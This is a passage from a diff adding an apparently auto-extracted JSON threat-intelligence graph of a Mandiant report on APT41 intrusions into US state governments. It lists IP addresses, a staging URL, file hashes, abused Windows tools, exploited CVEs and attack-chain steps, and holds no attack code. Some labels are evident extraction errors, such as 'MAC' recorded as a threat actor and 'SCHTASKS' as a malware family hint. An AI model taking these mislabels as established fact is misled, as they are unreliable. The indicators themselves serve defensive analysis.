+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_34.139.13.46",
+      "type": "IPv4",
+      "name": "34.139.13.46",
+      "normalized_name": "34.139.13.46",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "34.139.13.46",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_45.153.231.31",
+      "type": "IPv4",
+      "name": "45.153.231.31",
+      "normalized_name": "45.153.231.31",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "45.153.231.31",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_45.84.1.181",
+      "type": "IPv4",
+      "name": "45.84.1.181",
+      "normalized_name": "45.84.1.181",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "45.84.1.181",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_54.248.110.45",
+      "type": "IPv4",
+      "name": "54.248.110.45",
+      "normalized_name": "54.248.110.45",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "54.248.110.45",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_54.80.67.241",
+      "type": "IPv4",
+      "name": "54.80.67.241",
+      "normalized_name": "54.80.67.241",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "54.80.67.241",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_67.205.132.162",
+      "type": "IPv4",
+      "name": "67.205.132.162",
+      "normalized_name": "67.205.132.162",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "67.205.132.162",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_url_http_103.224.80.44_8080_kernel",
+      "type": "URL",
+      "name": "http://103.224.80.44:8080/kernel",
+      "normalized_name": "http://103.224.80.44:8080/kernel",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_119"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "http://103.224.80.44:8080/kernel",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_119",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_ioc_sha1_355b3ff61db44d18003537be8496eb03536e300f",
+      "type": "SHA1",
+      "name": "355b3ff61db44d18003537be8496eb03536e300f",
+      "normalized_name": "355b3ff61db44d18003537be8496eb03536e300f",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_177",
+        "ev_178"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "355b3ff61db44d18003537be8496eb03536e300f",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_177",
+      "supporting_evidence_ids": [
+        "ev_178"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_6f6b51e6c88e5252a2a117ca1cfb57934930166b",
+      "type": "SHA1",
+      "name": "6f6b51e6c88e5252a2a117ca1cfb57934930166b",
+      "normalized_name": "6f6b51e6c88e5252a2a117ca1cfb57934930166b",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_137"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "6f6b51e6c88e5252a2a117ca1cfb57934930166b",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_137",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_7056b044f97e3e349e3e0183311bb44b0bc3464f",
+      "type": "SHA1",
+      "name": "7056b044f97e3e349e3e0183311bb44b0bc3464f",
+      "normalized_name": "7056b044f97e3e349e3e0183311bb44b0bc3464f",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_136"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "7056b044f97e3e349e3e0183311bb44b0bc3464f",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_136",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_996aa691bbc1250b571a2f5423a5d5e2da8317e6",
+      "type": "SHA1",
+      "name": "996aa691bbc1250b571a2f5423a5d5e2da8317e6",
+      "normalized_name": "996aa691bbc1250b571a2f5423a5d5e2da8317e6",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_179",
+        "ev_180"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "996aa691bbc1250b571a2f5423a5d5e2da8317e6",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_179",
+      "supporting_evidence_ids": [
+        "ev_180"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_e85427af661fe5e853c8c9398dc46ddde50e2241",
+      "type": "SHA1",
+      "name": "e85427af661fe5e853c8c9398dc46ddde50e2241",
+      "normalized_name": "e85427af661fe5e853c8c9398dc46ddde50e2241",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_135"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "e85427af661fe5e853c8c9398dc46ddde50e2241",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_135",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_143278845a3f5276a1dd5860e7488313",
+      "type": "MD5",
+      "name": "143278845a3f5276a1dd5860e7488313",
+      "normalized_name": "143278845a3f5276a1dd5860e7488313",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_137"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "143278845a3f5276a1dd5860e7488313",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_137",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_49f1daea8a115dd6fce51a1328d863cf",
+      "type": "MD5",
+      "name": "49f1daea8a115dd6fce51a1328d863cf",
+      "normalized_name": "49f1daea8a115dd6fce51a1328d863cf",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_121",
+        "ev_135",
+        "ev_54"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "49f1daea8a115dd6fce51a1328d863cf",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_121",
+      "supporting_evidence_ids": [
+        "ev_54",
+        "ev_135"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_900ca3ee85dfc109baeed4888ccb5d39",
+      "type": "MD5",
+      "name": "900ca3ee85dfc109baeed4888ccb5d39",
+      "normalized_name": "900ca3ee85dfc109baeed4888ccb5d39",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_178"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "900ca3ee85dfc109baeed4888ccb5d39",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_178",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_b108b28138b93ec4822e165b82e41c7a",
+      "type": "MD5",
+      "name": "b108b28138b93ec4822e165b82e41c7a",
+      "normalized_name": "b108b28138b93ec4822e165b82e41c7a",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_121",
+        "ev_136",
+        "ev_54"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "b108b28138b93ec4822e165b82e41c7a",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_121",
+      "supporting_evidence_ids": [
+        "ev_54",
+        "ev_136"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_b82456963d04f44e83442b6393face47",
+      "type": "MD5",
+      "name": "b82456963d04f44e83442b6393face47",
+      "normalized_name": "b82456963d04f44e83442b6393face47",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_178",
+        "ev_180"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "b82456963d04f44e83442b6393face47",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_180",
+      "supporting_evidence_ids": [
+        "ev_178"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_file_cmd.exe",
+      "type": "File",
+      "name": "cmd.exe",
+      "normalized_name": "cmd.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_132",
+        "ev_99"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "file_name": "cmd.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_99",
+      "supporting_evidence_ids": [
+        "ev_132"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "abused_legitimate_file",
+      "is_likely_legitimate": true,
+      "family_hints": [
+        "DEADEYE"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_dsquery.exe",
+      "type": "File",
+      "name": "dsquery.exe",
+      "normalized_name": "dsquery.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_121",
+        "ev_124",
+        "ev_126",
+        "ev_54"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "file_name": "dsquery.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_121",
+      "supporting_evidence_ids": [
+        "ev_54",
+        "ev_126",
+        "ev_124"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_HealthService.exe",
+      "type": "File",
+      "name": "HealthService.exe",
+      "normalized_name": "HealthService.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_130",
+        "ev_87"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "file_name": "HealthService.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_130",
+      "supporting_evidence_ids": [
+        "ev_87"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "malicious_component",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_msiexec.exe",
+      "type": "File",
+      "name": "msiexec.exe",
+      "normalized_name": "msiexec.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_129"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "file_name": "msiexec.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_129",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "SCHTASKS",
+        "SHELL32",
+        "S-1-5-18",
+        "HIGHEST"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_rundll32.exe",
+      "type": "File",
+      "name": "rundll32.exe",
+      "normalized_name": "rundll32.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_129"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "file_name": "rundll32.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_129",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "abused_legitimate_file",
+      "is_likely_legitimate": true,
+      "family_hints": [
+        "SCHTASKS",
+        "SHELL32",
+        "S-1-5-18",
+        "HIGHEST"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_S-1-5-18.dat",
+      "type": "File",
+      "name": "S-1-5-18.dat",
+      "normalized_name": "S-1-5-18.dat",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_129"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "file_name": "S-1-5-18.dat",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_129",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "config_or_data",
+      "family_hints": [
+        "SCHTASKS",
+        "SHELL32",
+        "S-1-5-18",
+        "HIGHEST"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_syslog.dll",
+      "type": "File",
+      "name": "syslog.dll",
+      "normalized_name": "syslog.dll",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_127"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "file_name": "syslog.dll",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_127",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_syslog_6-1.dat",
+      "type": "File",
+      "name": "syslog_6-1.dat",
+      "normalized_name": "syslog_6-1.dat",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_101",
+        "ev_102",
+        "ev_138",
+        "ev_139"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "file_name": "syslog_6-1.dat",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_138",
+      "supporting_evidence_ids": [
+        "ev_101",
+        "ev_139",
+        "ev_102"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "config_or_data",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_shell32.dll",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "File",
+      "name": "shell32.dll",
+      "normalized_name": "shell32.dll",
+      "aliases": [],
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_128"
+      ],
+      "sources": [
+        "event_derive"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact",
+      "file_name": "shell32.dll",
+      "file_role": "file_artifact"
+    }
+  ],
+  "relations": [
+    {
+      "id": "rel_0001",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "alias_of",
+      "head_id": "ent_threatactor_MAC",
+      "tail_id": "ent_threatactor_Message_Authentication_Code",
+      "head_type": "ThreatActor",
+      "tail_type": "ThreatActor",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_20",
+        "ev_23"
+      ],
+      "primary_evidence_id": "ev_20",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0002",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "alias_of",
+      "head_id": "ent_tool_dsquery.dll",
+      "tail_id": "ent_tool_Dsquery",
+      "head_type": "Tool",
+      "tail_type": "Tool",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_121",
+        "ev_54"
+      ],
+      "primary_evidence_id": "ev_121",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0003",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "executes",
+      "head_id": "ent_malware_DUSTPAN",
+      "tail_id": "ent_file_shell32.dll",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.84,
+      "evidence_ids": [
+        "ev_84"
+      ],
+      "primary_evidence_id": "ev_84",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_execute",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0004",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "exploits",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_cve_CVE-2021-44207",
+      "head_type": "ThreatActor",
+      "tail_type": "CVE",
+      "confidence": 0.91,
+      "evidence_ids": [
+        "ev_34",
+        "ev_111"
+      ],
+      "primary_evidence_id": "ev_34",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "exploited",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "initial_access",
+        "notes": "event_exploit, evidence_exploit; report_exploit_support",
+        "schema_version": "v2.0-evidence",
+        "evidence_span": "ev_34"
+      }
+    },
+    {
+      "id": "rel_0005",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "exploits",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_cve_CVE-2021-44228",
+      "head_type": "ThreatActor",
+      "tail_type": "CVE",
+      "confidence": 0.91,
+      "evidence_ids": [
+        "ev_39",
+        "ev_117"
+      ],
+      "primary_evidence_id": "ev_39",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "exploits",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "initial_access",
+        "notes": "event_exploit, evidence_exploit; report_exploit_support",
+        "schema_version": "v2.0-evidence",
+        "evidence_span": "ev_39"
+      }
+    },
+    {
+      "id": "rel_0006",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "targets",
+      "head_id": "ent_campaign_State_Government_Campaign",
+      "tail_id": "ent_victim_U.S._state_government",
+      "head_type": "Campaign",
+      "tail_type": "Victim",
+      "confidence": 0.86,
+      "evidence_ids": [
+        null,
+        "ev_4",
+        "ev_8",
+        "ev_15",
+        "ev_16",
+        "ev_26",
+        "ev_41",
+        "ev_42",
+        "ev_44",
+        "ev_45",
+        "ev_46",
+        "ev_66",
+        "ev_88",
+        "ev_94",
+        "ev_118"
+      ],
+      "primary_evidence_id": null,
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "targets",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "title_target, evidence_target",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0007",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "targets",
+      "head_id": "ent_campaign_State_Government_Campaign",
+      "tail_id": "ent_victim_U.S._state_government_networks",
+      "head_type": "Campaign",
+      "tail_type": "Victim",
+      "confidence": 0.86,
+      "evidence_ids": [
+        null,
+        "ev_4",
+        "ev_8",
+        "ev_15",
+        "ev_16",
+        "ev_26",
+        "ev_41",
+        "ev_42",
+        "ev_44",
+        "ev_45",
+        "ev_46",
+        "ev_66",
+        "ev_88",
+        "ev_94",
+        "ev_118"
+      ],
+      "primary_evidence_id": null,
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "targets",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "title_target, evidence_target",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0008",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "uses_malware",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_malware_BEACON",
+      "head_type": "ThreatActor",
+      "tail_type": "Malware",
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_58",
+        "ev_59"
+      ],
+      "primary_evidence_id": "ev_58",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "used",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "execution",
+        "notes": "",
+        "schema_version": "v2.0-evidence"
+      }
+    },
+    {
+      "id": "rel_0009",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "uses_malware",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_malware_Cobalt_Strike_BEACON",
+      "head_type": "ThreatActor",
+      "tail_type": "Malware",
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_58",
+        "ev_59"
+      ],
+      "primary_evidence_id": "ev_58",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "used",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "execution",
+        "notes": "",
+        "schema_version": "v2.0-evidence"
+      }
+    },
+    {
+      "id": "rel_0010",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "uses_malware",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_malware_DUSTPAN",
+      "head_type": "ThreatActor",
+      "tail_type": "Malware",
+      "confidence": 0.92,
+      "evidence_ids": [
+        "ev_56",
+        "ev_55",
+        "ev_57",
+        "ev_58",
+        "ev_59",
+        "ev_44"
+      ],
+      "primary_evidence_id": "ev_56",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "used",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "execution",
+        "notes": "event_use, headline_or_event_use; headline_actor_tool",
+        "schema_version": "v2.0-evidence",
+        "evidence_span": "state government intrusion, Mandiant identified a new malware family used by APT41 we track as DUSTPAN."
+      }
+    },
+    {
+      "id": "rel_0011",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "type": "uses_tool",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_tool_Dsquery",
+      "head_type": "ThreatActor",
+      "tail_type": "Tool",
+      "confidence": 0.84,
+      "evidence_ids": [
+        "ev_121"
+      ],
+      "primary_evidence_id": "ev_121",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "uses_tool",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "sparse_core_use_recovery; headline_actor_tool",
+        "schema_version": "v4.0-event-refiner",
+        "evidence_span": "APT41 also conducted Active Directory reconnaissance by uploading the Windows command-line tool dsquery.exe (MD5: 49f1daea8a115dd6fce51a1328d863cf) and its associated module dsquery.dll (MD5: b108b28138b93ec4822e165b82e41c7a) to a staging directory on the compromised server. Figure 7 shows multiple dsquery commands used to enumerate various Active Directory objects within the environment."
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step_id": "step_001",
+      "stage": "initial_access",
+      "relation_id": "rel_0004",
+      "type": "exploits",
+      "summary": "APT41 exploits CVE-2021-44207",
+      "evidence_ids": [
+        "ev_34",
+        "ev_111"
+      ]
+    },
+    {
+      "step_id": "step_002",
+      "stage": "initial_access",
+      "relation_id": "rel_0005",
+      "type": "exploits",
+      "summary": "APT41 exploits CVE-2021-44228",
+      "evidence_ids": [
+        "ev_39",
+        "ev_117"
+      ]
+    },
+    {
+      "step_id": "step_003",
+      "stage": "execution",
+      "relation_id": "rel_0003",
+      "type": "executes",
+      "summary": "DUSTPAN executes shell32.dll",
+      "evidence_ids": [
+        "ev_84"
+      ]
+    },
+    {
+      "step_id": "step_004",
+      "stage": "execution",
+      "relation_id": "rel_0008",
+      "type": "uses_malware",
+      "summary": "APT41 uses_malware BEACON",
+      "evidence_ids": [
+        "ev_58",
+        "ev_59"
+      ]
+    },
+    {
+      "step_id": "step_005",
+      "stage": "execution",
+      "relation_id": "rel_0009",
+      "type": "uses_malware",
+      "summary": "APT41 uses_malware Cobalt Strike BEACON",
+      "evidence_ids": [
